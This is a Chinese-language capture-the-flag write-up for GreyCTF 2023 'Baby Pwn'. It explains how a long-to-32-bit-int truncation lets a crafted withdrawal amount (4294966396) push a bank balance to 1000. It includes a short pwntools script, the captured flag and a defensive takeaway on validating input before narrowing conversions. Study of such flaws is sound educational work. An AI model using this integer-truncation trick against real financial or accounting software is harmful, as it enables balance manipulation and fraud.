# GreyCTF2023 Baby Pwn

## 题目简述

银行程序以 `int accountBalance = 100` 开始，余额达到 1000 即输出 flag。取款金额读入 `long int withdrawalAmount`，但 `accountBalance - withdrawalAmount` 被保存到 32 位 `int tmp`；程序只在截断之后检查 `tmp < 0`。

## 解题过程

选择取款功能并提交官方脚本使用的数值：

```text
2
4294966396
```

数学上的差值为

$100-4294966396=-4294966296$。

它赋给 32 位 `int` 后按模 $2^{32}$ 截断为 1000，因此 `tmp < 0` 为假，余额更新为 1000，循环结束：

```python
io.sendline(b"2")
io.sendline(b"4294966396")
print(io.recvall().decode())
```

也可以直接提交负取款额让余额增加，但上述输入更直接展示了题目中的宽度转换缺陷。服务返回：

```text
grey{b4by_pwn_df831aa280e25ed6c3d70653b8f165b7}
```

## 方法总结

安全检查若发生在窄化转换之后，就检查不到原始算术结果。这里 `long` 到 `int` 的截断把一个巨大负数变成合法正余额。审计金额与计数逻辑时，应统一符号和位宽，并在转换前验证输入范围、溢出和业务语义；仅检查最终变量是否小于零并不充分。
